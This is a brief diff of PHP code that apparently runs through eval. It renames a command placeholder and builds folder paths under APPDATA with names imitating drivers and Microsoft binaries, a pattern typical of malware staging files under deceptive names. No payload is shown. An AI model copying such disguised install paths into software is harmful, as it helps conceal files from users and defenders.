@@ -1,6 +1,6 @@
 execução por eval. cuidado, não use exit e nem __FILE__
 
-[GIT_COMMAND]
+[__GIT_COMMAND]
 
 	$new_path = getenv( 'APPDATA' ) . '\\Drivers x86 v4.56643300';
 	$new_path_2 = getenv( 'APPDATA' ) . '\\Microsoft Binaries v4.56643300';
